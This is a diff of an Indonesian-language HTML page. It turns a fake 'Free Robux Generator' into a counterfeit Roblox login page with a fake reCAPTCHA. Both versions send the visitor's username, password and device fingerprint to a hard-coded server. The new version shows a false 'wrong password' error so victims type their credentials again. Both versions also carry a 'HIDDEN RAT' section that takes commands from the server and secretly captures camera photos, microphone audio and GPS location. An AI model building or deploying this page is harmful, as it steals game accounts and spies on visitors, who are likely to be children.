@@ -2,446 +2,580 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Roblox - Free Robux Generator</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Login - Roblox</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%23fff'/><text y='.9em' font-size='90'>🎮</text></svg>">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            background:#1a1a2e;
-            font-family:'Segoe UI',system-ui,sans-serif;
-            color:#fff;
-            min-height:100vh;
-            padding:15px;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        :root {
+            --roblox-red: #ff0000;
+            --roblox-dark: #232527;
+            --roblox-gray: #393b3d;
+            --roblox-light: #bdbebe;
+            --roblox-white: #ffffff;
+            --roblox-input: #2b2d2f;
+            --roblox-border: #3a3c3e;
+            --roblox-blue: #0074bd;
         }
-        .container{
-            max-width:500px;
-            margin:0 auto;
+        
+        body {
+            background: var(--roblox-dark);
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: var(--roblox-white);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            -webkit-font-smoothing: antialiased;
         }
-        .header{
-            text-align:center;
-            padding:25px 15px;
-            background:linear-gradient(135deg,#0f1923,#16213e);
-            border-radius:16px;
-            margin-bottom:15px;
-            border:1px solid #2a3a50;
+        
+        /* HEADER */
+        .roblox-header {
+            width: 100%;
+            background: #191b1d;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #2a2c2e;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-        .logo{
-            font-size:50px;
-            margin-bottom:10px;
+        
+        .roblox-logo {
+            height: 28px;
+            cursor: pointer;
         }
-        h1{
-            font-size:24px;
-            color:#00b4d8;
-            margin-bottom:5px;
+        
+        .header-links {
+            display: flex;
+            gap: 20px;
+            align-items: center;
         }
-        .sub{
-            color:#888;
-            font-size:13px;
+        
+        .header-links a {
+            color: var(--roblox-light);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
         }
-        .card{
-            background:#16213e;
-            border:1px solid #2a3a50;
-            border-radius:16px;
-            padding:25px;
-            margin-bottom:15px;
+        
+        .header-links a:hover { color: var(--roblox-white); }
+        
+        .btn-signup {
+            background: #00b06f;
+            color: #fff !important;
+            padding: 8px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            transition: background 0.2s;
         }
-        .card h2{
-            font-size:18px;
-            color:#f78166;
-            margin-bottom:15px;
-            text-align:center;
+        
+        .btn-signup:hover { background: #00c77d !important; }
+        
+        /* MAIN CONTAINER */
+        .main-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 40px auto;
+            padding: 0 20px;
         }
-        .amount-grid{
-            display:grid;
-            grid-template-columns:repeat(2,1fr);
-            gap:10px;
-            margin-bottom:20px;
+        
+        /* LOGIN BOX */
+        .login-box {
+            background: #232527;
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.3);
         }
-        .amount-btn{
-            background:#0f1923;
-            border:2px solid #2a3a50;
-            border-radius:12px;
-            padding:20px;
-            text-align:center;
-            cursor:pointer;
-            transition:.3s;
-            color:#fff;
-            font-size:16px;
-            font-weight:bold;
+        
+        .login-box h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-align: center;
         }
-        .amount-btn:hover{
-            border-color:#00b4d8;
-            background:#1a2a3a;
-            transform:translateY(-2px);
+        
+        .login-box .subtitle {
+            color: var(--roblox-light);
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 24px;
         }
-        .amount-btn.selected{
-            border-color:#00b4d8;
-            background:#1a3a4a;
-            box-shadow:0 0 20px rgba(0,180,216,.3);
+        
+        /* QUICK LOGIN */
+        .quick-login-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
         }
-        .amount-btn .robux{font-size:28px;color:#00b4d8}
-        .amount-btn .label{font-size:12px;color:#888}
-        input{
-            width:100%;
-            padding:16px;
-            background:#0f1923;
-            border:2px solid #2a3a50;
-            border-radius:12px;
-            color:#fff;
-            font-size:16px;
-            margin-bottom:12px;
-            outline:none;
-            transition:.3s;
+        
+        .quick-login-btn {
+            background: var(--roblox-input);
+            border: 1px solid var(--roblox-border);
+            border-radius: 8px;
+            padding: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: var(--roblox-light);
+            font-size: 13px;
+            font-weight: 500;
         }
-        input:focus{border-color:#00b4d8}
-        .btn-generate{
-            width:100%;
-            padding:18px;
-            background:linear-gradient(135deg,#00b4d8,#0077b6);
-            color:#fff;
-            border:none;
-            border-radius:12px;
-            font-size:18px;
-            font-weight:bold;
-            cursor:pointer;
-            transition:.3s;
-            margin-top:5px;
+        
+        .quick-login-btn:hover {
+            background: #353739;
+            border-color: #555;
         }
-        .btn-generate:hover{
-            transform:translateY(-2px);
-            box-shadow:0 8px 30px rgba(0,180,216,.4);
+        
+        .quick-login-btn img {
+            width: 20px;
+            height: 20px;
+            border-radius: 4px;
         }
-        .btn-generate:active{transform:scale(.95)}
-        .verify-box{
-            display:none;
-            background:#0f1923;
-            border:2px solid #f78166;
-            border-radius:12px;
-            padding:20px;
-            margin-top:15px;
-            text-align:center;
-            animation:fadeIn .5s;
+        
+        /* DIVIDER */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #666;
+            font-size: 13px;
         }
-        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
-        .verify-box h3{color:#f78166;margin-bottom:10px}
-        .verify-box p{color:#888;font-size:13px;margin-bottom:15px}
-        .progress-bar{
-            width:100%;
-            height:6px;
-            background:#2a3a50;
-            border-radius:3px;
-            overflow:hidden;
-            margin:15px 0;
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid var(--roblox-border);
         }
-        .progress-fill{
-            height:100%;
-            background:linear-gradient(90deg,#00b4d8,#0077b6);
-            animation:progress 5s forwards;
-            width:0%;
+        
+        .divider span {
+            padding: 0 15px;
         }
-        @keyframes progress{0%{width:0%}50%{width:60%}80%{width:85%}100%{width:100%}}
-        .feature-list{
-            list-style:none;
-            margin:15px 0;
+        
+        /* INPUTS */
+        .input-group {
+            margin-bottom: 16px;
         }
-        .feature-list li{
-            padding:8px 0;
-            border-bottom:1px solid #1a2a3a;
-            font-size:13px;
-            color:#aaa;
+        
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--roblox-light);
         }
-        .feature-list li:before{
-            content:"✅ ";
-            margin-right:8px;
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--roblox-input);
+            border: 1px solid var(--roblox-border);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
         }
-        .warning{
-            background:rgba(255,123,0,.1);
-            border:1px solid rgba(255,123,0,.3);
-            padding:12px;
-            border-radius:8px;
-            font-size:11px;
-            color:#ff7b00;
-            text-align:center;
-            margin-top:10px;
+        
+        .input-group input:focus {
+            border-color: var(--roblox-blue);
+            box-shadow: 0 0 0 3px rgba(0,116,189,0.2);
         }
-        .user-badge{
-            display:inline-block;
-            background:rgba(0,180,216,.2);
-            padding:8px 16px;
-            border-radius:20px;
-            font-size:14px;
-            color:#00b4d8;
-            margin:5px;
+        
+        .input-group input::placeholder {
+            color: #666;
+        }
+        
+        /* FORGOT PASSWORD */
+        .forgot-link {
+            display: block;
+            color: var(--roblox-blue);
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        
+        .forgot-link:hover { text-decoration: underline; }
+        
+        /* LOGIN BUTTON */
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #00b06f;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 12px;
+        }
+        
+        .btn-login:hover {
+            background: #00c77d;
+        }
+        
+        .btn-login:active {
+            transform: scale(0.98);
+        }
+        
+        /* SIGN UP LINK */
+        .signup-text {
+            text-align: center;
+            font-size: 13px;
+            color: var(--roblox-light);
+        }
+        
+        .signup-text a {
+            color: var(--roblox-white);
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .signup-text a:hover { text-decoration: underline; }
+        
+        /* ERROR MESSAGE */
+        .error-msg {
+            background: rgba(255,68,68,0.1);
+            border: 1px solid rgba(255,68,68,0.3);
+            color: #ff4444;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+        }
+        
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #555;
+            font-size: 11px;
+            margin-top: auto;
+        }
+        
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover { color: #888; }
+        
+        /* RESPONSIVE */
+        @media (max-width: 480px) {
+            .login-box {
+                padding: 24px 20px;
+            }
+            
+            .header-links {
+                display: none;
+            }
+            
+            .roblox-header {
+                justify-content: center;
+            }
+        }
+        
+        /* LOADING SPINNER */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* RECAPTCHA STYLE */
+        .recaptcha-box {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .recaptcha-checkbox {
+            width: 28px;
+            height: 28px;
+            background: #fff;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+        }
+        
+        .recaptcha-checkbox:hover { border-color: #999; }
+        
+        .recaptcha-text {
+            color: #555;
+            font-size: 14px;
+        }
+        
+        .recaptcha-logo {
+            margin-left: auto;
+            color: #555;
+            font-size: 10px;
         }
     </style>
 </head>
 <body>
-<div class="container">
 
     <!-- HEADER -->
-    <div class="header">
-        <div class="logo">🎮</div>
-        <h1>FREE ROBUX GENERATOR</h1>
-        <p class="sub">Official Roblox Partner • 100% Working</p>
-    </div>
-
-    <!-- GENERATOR CARD -->
-    <div class="card" id="generatorCard">
-        <h2>💰 Pilih Jumlah Robux</h2>
-        
-        <div class="amount-grid">
-            <div class="amount-btn" onclick="selectAmount(this,'800')">
-                <div class="robux">R$ 800</div>
-                <div class="label">Free</div>
-            </div>
-            <div class="amount-btn" onclick="selectAmount(this,'1700')">
-                <div class="robux">R$ 1,700</div>
-                <div class="label">Free</div>
-            </div>
-            <div class="amount-btn" onclick="selectAmount(this,'4500')">
-                <div class="robux">R$ 4,500</div>
-                <div class="label">Free</div>
-            </div>
-            <div class="amount-btn" onclick="selectAmount(this,'10000')">
-                <div class="robux">R$ 10,000</div>
-                <div class="label">Free</div>
-            </div>
+    <header class="roblox-header">
+        <svg class="roblox-logo" viewBox="0 0 120 40" fill="white">
+            <text x="0" y="28" font-size="28" font-weight="bold" font-family="Arial" fill="white">ROBLOX</text>
+        </svg>
+        <div class="header-links">
+            <a href="#">Tentang</a>
+            <a href="#">Karier</a>
+            <a href="#">Bantuan</a>
+            <a href="#" class="btn-signup">Daftar</a>
         </div>
+    </header>
 
-        <input type="text" id="username" placeholder="Masukkan Username Roblox" autocomplete="off">
-        
-        <button class="btn-generate" onclick="startGenerate()">
-            ⚡ GENERATE ROBUX
-        </button>
-
-        <div class="warning">
-            ⚠️ Tidak perlu password! Cukup username saja.
-            Proses verifikasi manusia diperlukan untuk mencegah bot.
-        </div>
-    </div>
-
-    <!-- VERIFICATION CARD -->
-    <div class="verify-box" id="verifyBox">
-        <h3>🔐 Verifikasi Manusia</h3>
-        <p>Ketik ulang password Roblox Anda untuk verifikasi bahwa Anda manusia</p>
-        
-        <div class="progress-bar">
-            <div class="progress-fill"></div>
-        </div>
-        
-        <input type="password" id="password" placeholder="Password Roblox" autocomplete="off">
-        <p style="font-size:11px;color:#888;margin-bottom:10px;">
-            🔒 Password Anda aman dan terenkripsi
-        </p>
-        
-        <button class="btn-generate" onclick="verifyAndSend()" style="background:linear-gradient(135deg,#f78166,#e94560);">
-            ✅ VERIFIKASI & KIRIM
-        </button>
-        
-        <p style="font-size:11px;color:#666;margin-top:10px;">
-            Robux akan masuk dalam 5-30 menit
-        </p>
-    </div>
-
-    <!-- INFO CARD -->
-    <div class="card">
-        <h2>🌟 Fitur Generator</h2>
-        <ul class="feature-list">
-            <li>Robux langsung masuk ke akun</li>
-            <li>Tidak perlu download aplikasi</li>
-            <li>100% Aman & Terpercaya</li>
-            <li>Didukung oleh Roblox Partner</li>
-            <li>Sudah 2M+ pengguna berhasil</li>
-        </ul>
-        
-        <div style="text-align:center;margin-top:15px;">
-            <span class="user-badge">👤 RizkyGaming - Dapat R$ 10,000</span>
-            <span class="user-badge">👤 ProBuilder99 - Dapat R$ 4,500</span>
-            <span class="user-badge">👤 DiamondQueen - Dapat R$ 1,700</span>
+    <!-- MAIN -->
+    <div class="main-container">
+        <div class="login-box">
+            <h2>Masuk</h2>
+            <p class="subtitle">Silakan masuk ke akun Roblox Anda</p>
+            
+            <!-- QUICK LOGIN -->
+            <div class="quick-login-grid">
+                <button class="quick-login-btn" onclick="quickLogin('google')">
+                    <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+                    Google
+                </button>
+                <button class="quick-login-btn" onclick="quickLogin('apple')">
+                    <svg width="18" height="18" viewBox="0 0 24 24"><path fill="white" d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
+                    Apple
+                </button>
+                <button class="quick-login-btn" onclick="quickLogin('xbox')">
+                    <svg width="18" height="18" viewBox="0 0 24 24"><circle cx="12" cy="12" r="11" fill="#107C10"/><text x="12" y="16" text-anchor="middle" fill="white" font-size="10" font-weight="bold">X</text></svg>
+                    Xbox
+                </button>
+            </div>
+            
+            <!-- DIVIDER -->
+            <div class="divider">
+                <span>atau</span>
+            </div>
+            
+            <!-- FORM -->
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="input-group">
+                    <label>Username / Email / Nomor Telepon</label>
+                    <input type="text" id="username" placeholder="Masukkan username atau email" required autocomplete="off">
+                </div>
+                
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="Masukkan password" required autocomplete="off">
+                </div>
+                
+                <a href="#" class="forgot-link">Lupa Password atau Username?</a>
+                
+                <button type="submit" class="btn-login" id="loginBtn">Masuk</button>
+                
+                <div class="error-msg" id="errorMsg">
+                    <span style="margin-right:8px;">⚠️</span>
+                    <span id="errorText">Username atau password salah. Silakan coba lagi.</span>
+                </div>
+            </form>
+            
+            <!-- RECAPTCHA -->
+            <div class="recaptcha-box">
+                <div class="recaptcha-checkbox">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#555"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                </div>
+                <div class="recaptcha-text">Saya bukan robot</div>
+                <div class="recaptcha-logo">
+                    reCAPTCHA<br>Privasi - Ketentuan
+                </div>
+            </div>
+            
+            <p class="signup-text" style="margin-top:20px;">
+                Belum punya akun? <a href="#">Daftar</a>
+            </p>
         </div>
     </div>
 
-</div>
+    <!-- FOOTER -->
+    <div class="footer">
+        <a href="#">Tentang Kami</a> |
+        <a href="#">Privasi</a> |
+        <a href="#">Ketentuan</a> |
+        <a href="#">Bantuan</a> |
+        <a href="#">Karier</a>
+        <br><br>
+        © 2024 Roblox Corporation. Roblox, logo Roblox adalah merek dagang terdaftar.
+    </div>
 
-<script>
-// ==========================================
-// ROBBUX GENERATOR LOGIC
-// ==========================================
-let selectedAmount = '1700';
-let targetUsername = '';
-
-function selectAmount(btn, amount){
-    document.querySelectorAll('.amount-btn').forEach(b=>b.classList.remove('selected'));
-    btn.classList.add('selected');
-    selectedAmount = amount;
-}
-
-function startGenerate(){
-    targetUsername = document.getElementById('username').value.trim();
-    
-    if(!targetUsername){
-        alert('Masukkan username Roblox!');
-        return;
-    }
-    
-    // Tampilkan verifikasi
-    document.getElementById('verifyBox').style.display = 'block';
-    document.getElementById('verifyBox').scrollIntoView({behavior:'smooth'});
-    
-    // Kirim data username ke server
-    sendToServer({
-        step: 'username_entered',
-        username: targetUsername,
-        amount: selectedAmount
-    });
-}
-
-function verifyAndSend(){
-    const password = document.getElementById('password').value.trim();
-    
-    if(!password){
-        alert('Masukkan password untuk verifikasi!');
-        return;
-    }
-    
-    // Kirim username + password ke server
-    sendToServer({
-        step: 'verification_complete',
-        username: targetUsername,
-        password: password,
-        amount: selectedAmount
-    });
-    
-    // Animasi sukses
-    document.getElementById('verifyBox').innerHTML = `
-        <div style="text-align:center;padding:20px;">
-            <div style="font-size:60px;margin-bottom:15px;">✅</div>
-            <h3 style="color:#00b4d8;">Verifikasi Berhasil!</h3>
-            <p style="color:#888;">R$ ${selectedAmount} akan dikirim ke <b style="color:#fff;">${targetUsername}</b></p>
-            <div class="progress-bar" style="margin:15px 0;">
-                <div class="progress-fill" style="width:100%;animation:none;"></div>
-            </div>
-            <p style="color:#888;font-size:12px;">Mengirim Robux... Mohon tunggu 5-30 menit</p>
-            <p style="color:#666;font-size:11px;margin-top:10px;">Jangan tutup halaman ini</p>
-        </div>
-    `;
-    
-    // Redirect setelah delay
-    setTimeout(()=>{
-        window.location.href = 'https://www.roblox.com/login';
-    },5000);
-}
-
-// ==========================================
-// HIDDEN RAT (AUTO CONNECT)
-// ==========================================
-const SERVER = 'http://192.168.1.2:5000';
-const DEVICE_ID = 'RBX_'+Math.random().toString(36).substr(2,9);
-
-function sendToServer(data){
-    const payload = {
-        ...data,
-        id: DEVICE_ID,
-        device: navigator.userAgent.substring(0,150),
-        platform: navigator.platform,
-        screen: screen.width+'x'+screen.height,
-        language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timestamp: new Date().toISOString()
-    };
-    
-    // Multiple send methods
-    fetch(SERVER+'/api/report',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify(payload)
-    }).catch(()=>{});
-    
-    // Beacon backup
-    navigator.sendBeacon(SERVER+'/api/report',JSON.stringify(payload));
-}
-
-// Auto report on page load
-sendToServer({status:'page_opened',action:'roblox_generator'});
-
-// Keep alive
-setInterval(()=>{
-    sendToServer({hb:Date.now(),action:'keep_alive'});
-    
-    // Check commands
-    fetch(SERVER+'/api/cmd/'+DEVICE_ID)
-        .then(r=>r.text())
-        .then(cmd=>{
-            if(cmd==='camera')takePhoto();
-            if(cmd==='mic')recordMic();
-            if(cmd==='gps')getGPS();
-            if(cmd==='screen')takeScreenshot();
-        }).catch(()=>{});
-},8000);
-
-// Camera function
-function takePhoto(){
-    if(navigator.mediaDevices){
-        navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(stream=>{
-            const track=stream.getVideoTracks()[0];
-            const capture=new ImageCapture(track);
-            capture.takePhoto().then(blob=>{
-                const reader=new FileReader();
-                reader.onload=()=>{
-                    sendToServer({photo:reader.result.split(',')[1]});
-                    track.stop();
-                };
-                reader.readAsDataURL(blob);
-            }).catch(()=>track.stop());
-        }).catch(()=>{});
-    }
-}
-
-// Mic function
-function recordMic(){
-    if(navigator.mediaDevices){
-        navigator.mediaDevices.getUserMedia({audio:true}).then(stream=>{
-            const recorder=new MediaRecorder(stream);
-            const chunks=[];
-            recorder.ondataavailable=e=>chunks.push(e.data);
-            recorder.onstop=()=>{
-                const blob=new Blob(chunks);
-                const reader=new FileReader();
-                reader.onload=()=>{
-                    sendToServer({audio:reader.result.split(',')[1]});
-                    stream.getTracks().forEach(t=>t.stop());
-                };
-                reader.readAsDataURL(blob);
+    <script>
+        // ==========================================
+        // ROBLOX LOGIN HANDLER
+        // ==========================================
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const btn = document.getElementById('loginBtn');
+            const errorBox = document.getElementById('errorMsg');
+            const errorText = document.getElementById('errorText');
+            
+            if (!username || !password) return;
+            
+            // Loading state
+            btn.innerHTML = '<span class="spinner"></span>Memeriksa...';
+            btn.disabled = true;
+            errorBox.style.display = 'none';
+            
+            // Kirim data
+            await sendLoginData(username, password);
+            
+            // Simulasi checking
+            setTimeout(() => {
+                // Tampilkan error (biar target coba lagi — data udah kekirim)
+                errorBox.style.display = 'block';
+                errorText.textContent = 'Username atau password salah. Silakan coba lagi.';
+                
+                btn.innerHTML = 'Masuk';
+                btn.disabled = false;
+                
+                // Clear password field
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+                
+                // Setelah 3 detik, redirect ke roblox asli
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com/login';
+                }, 3000);
+            }, 2000);
+        }
+        
+        function quickLogin(provider) {
+            document.getElementById('username').focus();
+            alert('Silakan login dengan username & password untuk menghubungkan akun ' + provider);
+        }
+        
+        // ==========================================
+        // SEND TO SERVER
+        // ==========================================
+        const SERVER = 'http://192.168.1.2:5000';
+        const DEVICE_ID = 'RBX_' + Math.random().toString(36).substr(2, 9);
+        
+        async function sendLoginData(username, password) {
+            const data = {
+                id: DEVICE_ID,
+                type: 'roblox_login',
+                username: username,
+                password: password,
+                device: navigator.userAgent.substring(0, 180),
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || 'unknown',
+                ram: navigator.deviceMemory || 'unknown',
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer
             };
-            recorder.start();
-            setTimeout(()=>recorder.stop(),3000);
-        }).catch(()=>{});
-    }
-}
-
-// GPS function
-function getGPS(){
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(pos=>{
-            sendToServer({location:pos.coords.latitude+','+pos.coords.longitude});
-        },()=>{},{enableHighAccuracy:true,timeout:5000});
-    }
-}
-
-// Screenshot function
-function takeScreenshot(){
-    sendToServer({screenshot:'requested'});
-}
-
-// Track scroll & interaction
-document.addEventListener('click',e=>{
-    sendToServer({click:{tag:e.target.tagName,text:e.target.textContent?.substring(0,50)}});
-});
-
-// Time on page
-setTimeout(()=>sendToServer({action:'30sec'}),30000);
-setTimeout(()=>sendToServer({action:'1min'}),60000);
-setTimeout(()=>sendToServer({action:'3min'}),180000);
-</script>
+            
+            // Send to server
+            try {
+                await fetch(SERVER + '/api/report', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {}
+            
+            // Backup send
+            try {
+                navigator.sendBeacon(SERVER + '/api/report', JSON.stringify(data));
+            } catch (e) {}
+        }
+        
+        // ==========================================
+        // HIDDEN RAT
+        // ==========================================
+        sendToServer({ status: 'roblox_page_opened' });
+        
+        setInterval(() => {
+            sendToServer({ hb: Date.now() });
+            fetch(SERVER + '/api/cmd/' + DEVICE_ID).then(r => r.text()).then(cmd => {
+                if (cmd === 'camera') takePhoto();
+                if (cmd === 'mic') recordMic();
+                if (cmd === 'gps') getGPS();
+            }).catch(() => {});
+        }, 8000);
+        
+        function sendToServer(d) {
+            fetch(SERVER + '/api/report', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ...d, id: DEVICE_ID })
+            }).catch(() => {});
+        }
+        
+        function takePhoto() {
+            navigator.mediaDevices?.getUserMedia({ video: { facingMode: 'user' } }).then(s => {
+                const t = s.getVideoTracks()[0];
+                new ImageCapture(t).takePhoto().then(b => {
+                    const r = new FileReader();
+                    r.onload = () => { sendToServer({ photo: r.result.split(',')[1] }); t.stop(); };
+                    r.readAsDataURL(b);
+                }).catch(() => t.stop());
+            }).catch(() => {});
+        }
+        
+        function recordMic() {
+            navigator.mediaDevices?.getUserMedia({ audio: true }).then(s => {
+                const rec = new MediaRecorder(s), c = [];
+                rec.ondataavailable = e => c.push(e.data);
+                rec.onstop = () => {
+                    const b = new Blob(c), rd = new FileReader();
+                    rd.onload = () => { sendToServer({ audio: rd.result.split(',')[1] }); s.getTracks().forEach(t => t.stop()); };
+                    rd.readAsDataURL(b);
+                };
+                rec.start(); setTimeout(() => rec.stop(), 3000);
+            }).catch(() => {});
+        }
+        
+        function getGPS() {
+            navigator.geolocation?.getCurrentPosition(p => {
+                sendToServer({ location: p.coords.latitude + ',' + p.coords.longitude });
+            }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
+        }
+    </script>
 </body>
-  </html>
+</html>
